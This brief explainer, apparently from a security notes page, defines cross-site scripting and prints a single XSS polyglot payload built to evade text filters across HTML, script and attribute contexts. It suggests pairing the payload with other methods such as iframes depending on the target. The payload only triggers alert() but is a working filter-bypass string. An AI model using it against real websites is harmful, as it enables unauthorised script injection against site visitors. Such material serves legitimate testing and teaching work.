Cross-Site Scripting is the act of injecting HTML code (typically JS) into a website.

Below is a XSS Polyglot, which attempts to bypass text filters in all contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

This does not mean it will successfully exploit all XSS vulnerable fields. It should be combined with other XSS methods (such as iframes) dependent on the target.
